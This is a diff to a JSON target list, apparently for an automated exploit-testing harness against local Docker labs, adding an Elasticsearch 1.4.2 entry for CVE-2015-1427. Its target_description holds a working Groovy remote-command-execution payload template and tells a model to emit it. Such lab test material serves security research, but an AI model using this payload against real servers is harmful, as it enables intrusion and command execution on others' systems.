@@ -63,5 +63,25 @@
     "in_band": true,
     "type": "docker",
     "boot_wait_seconds": 5
+  },
+  {
+    "id": "elasticsearch-2015-1427",
+    "name": "Elasticsearch 1.4.2 Groovy RCE (CVE-2015-1427)",
+    "compose_path": "elasticsearch/CVE-2015-1427",
+    "port": 9200,
+    "url": "http://127.0.0.1:9200/",
+    "method": "POST",
+    "parameter_name": null,
+    "injection_point": "JSON_FIELD",
+    "vulnerability_type": "COMMAND_INJECTION",
+    "target_description": "Framework: Elasticsearch 1.4.2. Known vulnerability: CVE-2015-1427 Groovy scripting sandbox escape. The exploit endpoint is POST /_search with a JSON body. Set injection_point to JSON_FIELD and parameter_name to null. Emit ONLY the Groovy script expression in candidate_payload, not the surrounding JSON. Use this exact Groovy template, replacing {CMD} with the shell command:\n\njava.lang.Math.class.forName('java.lang.Runtime').getRuntime().exec('{CMD}').getText()\n\nThe {CMD} placeholder must appear exactly once, inside the exec() single-quoted string. The oracle will wrap your expression in the required JSON structure before dispatch.",
+    "language": "java",
+    "in_band": true,
+    "type": "docker",
+    "boot_wait_seconds": 20,
+    "seed_endpoint": "http://127.0.0.1:9200/website/blog/?refresh=true",
+    "seed_method": "POST",
+    "seed_body": "{\"title\":\"test\",\"content\":\"hello\"}",
+    "seed_content_type": "application/json"
   }
 ]
